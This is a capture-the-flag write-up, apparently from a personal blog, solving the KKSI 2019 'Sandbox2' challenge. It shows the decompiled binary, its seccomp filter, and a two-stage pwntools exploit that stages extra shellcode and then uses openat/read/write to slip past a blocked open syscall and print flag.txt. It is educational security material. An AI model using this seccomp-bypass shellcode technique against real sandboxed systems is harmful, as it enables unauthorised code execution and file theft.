---
layout: post
title: Kompetisi Keamanan Siber Indonesia CTF Quals 2019 - Sandbox2
date: 2019-12-17 00:00:00
categories: 
    - ctf
tags:
    - ctf
    - linux
    - x64
    - sandbox escape
---

### Sources

[https://github.com/fachrioktavian/ctf-writeup/tree/master/kksiquals19/sandbox2](https://github.com/fachrioktavian/ctf-writeup/tree/master/kksiquals19/sandbox2)

### Summary

This is a sandbox escape challenge, got from KKSI CTF Quals 2019.

#### Overview

This is a simple sandbox binary, it asks input from user. Those input then will be executed as a code.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int i;

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  printf("> ", 0LL);
  read(0, shellcode, 17uLL);
  for ( i = 0; i <= 0x10; ++i )
  {
    if ( shellcode[i] == 15 && shellcode[i + 1] == 5 )
    {
      puts("[*] blocked !");
      return -1;
    }
  }
  install_syscall_filter();
  (*shellcode)(0LL, shellcode);
  return 0;
}
```

```terminal
❯ ./sandbox2
> asd
[1]    22650 illegal hardware instruction (core dumped)  ./sandbox2
```

Its limitation is we can only submit a maximum 17 bytes of shellcode and seccomp protection is applied to the binary. We can't use some syscalls in the shellcode.

```terminal
❯ seccomp-tools dump sandbox2
>
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0006
 0005: 0x06 0x00 0x00 0x00000000  return KILL
 0006: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0008
 0007: 0x06 0x00 0x00 0x00000000  return KILL
 0008: 0x15 0x00 0x01 0x0000003a  if (A != vfork) goto 0010
 0009: 0x06 0x00 0x00 0x00000000  return KILL
 0010: 0x15 0x00 0x01 0x00000038  if (A != clone) goto 0012
 0011: 0x06 0x00 0x00 0x00000000  return KILL
 0012: 0x15 0x00 0x01 0x00000065  if (A != ptrace) goto 0014
 0013: 0x06 0x00 0x00 0x00000000  return KILL
 0014: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0016
 0015: 0x06 0x00 0x00 0x00000000  return KILL
 0016: 0x15 0x00 0x01 0x0000009d  if (A != prctl) goto 0018
 0017: 0x06 0x00 0x00 0x00000000  return KILL
 0018: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0020
 0019: 0x06 0x00 0x00 0x00000000  return KILL
 0020: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0022
 0021: 0x06 0x00 0x00 0x00000000  return KILL
 0022: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

Binary's protection:

```terminal
❯ checksec sandbox2
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

#### Exploitation's scenario

1. No PIE enabled so first we need to extend our shellcode by calling syscall `read`.

2. Using `openat`, `read`, and `write` syscalls to print value from flag.txt.

### Exploitation

#### Helper

```python
r = process("./sandbox2", aslr=1)
e = ELF('./sandbox2', checksec=False)

gdb.attach(r, "b *0x400C18\nb* 0x400BA5") # for debugging
```

#### Stage 1. Extending shellcode

Because our shellcode can't be longer than 17 bytes, so we should use the space as best as possible. After debugging the binary, found that register `r12` holds address to `start` region. Subtract it a bit to point to `read` function. Then set return address value to where our next shellcode lies.

```python
pload1 = "sub r12, 80\n"
pload1 += "mov [rsp+0x18], rdx\n"
pload1 += "mov esi, edx\n"
pload1 += "xor edi, edi\n"
pload1 += "call r12\n"
pload1 += "ret\n"

pload1 = asm(pload1, vma=e.sym['shellcode'])
pload1 = pload1.ljust(0x11, '\x90')

r.recv()
r.send(pload1)
```

#### Stage 2. Reading flag

Because `open` is restricted by seccomp, we use `openat` that has similar functionality to `open`.

```python
pload2 = asm(
    shellcraft.linux.openat(-100, 'flag.txt', 0) +
    shellcraft.linux.read('rax', 'rsp', 0x200) +
    shellcraft.linux.write(1, 'rsp', 0x200) +
    "leave\nret"
)

pload2 = "\x90"*20 + pload2

r.send(pload2)

log.success(r.recv())
```

#### Result

```terminal
❯ python solve.py
[+] Starting local process './sandbox2': pid 24962
[*] Stage 1 > Extending shellcode
[*] Stage 2 > Reading flag
[*] Process './sandbox2' stopped with exit code 0 (pid 24962)
[+] flag{dummy_flag}
    \x0c@\x00\x00\x00\x00\x00�g�^\x11\x00\x00\x00\xb0 `\x00\x00\x00\x00\x00\xb0 `\x00\x00\x00\x00\x00\x97k�fs\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00�g�^�\x7f\x00\x00\x00\x80\x00\x00\x00\x00\x00?\x0b@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x85\x84����Ё0\x07@\x00\x00\x00\x00\x00�g�^�\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x85\x84�*\x18L(~\x85\x84\x1a2\x86<6\x7f\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x003g\x0egs\x7f\x00\x008�
         gs\x7f\x00\x00\x0e\xb4\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000\x07@\x00\x00\x00\x00\x00�g�^�Z@\x00\x00\x00\x00\x00�g�^�\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb9\x81\x9f^�\x00\x00\x00\x00\x00\x00ā\x9f^�΁\x9f^���\x9f^��\x9f^�-�\x9f^�E�\x9f^�]�\x9f^�~�\x9f^���\x9f^���\x9f^���\x9f^���\x9f^�˂\x9f^�ۂ\x9f^���\x9f^���\x9f^���\x9f^��\x9f^��\x9f^�5�\x9f^�I�\x9f^�\�\x9f^���\x9f^�ӄ\x9f^���\x9f^���\x9f^�
                       �\x9f^�!�\x9f^�

```
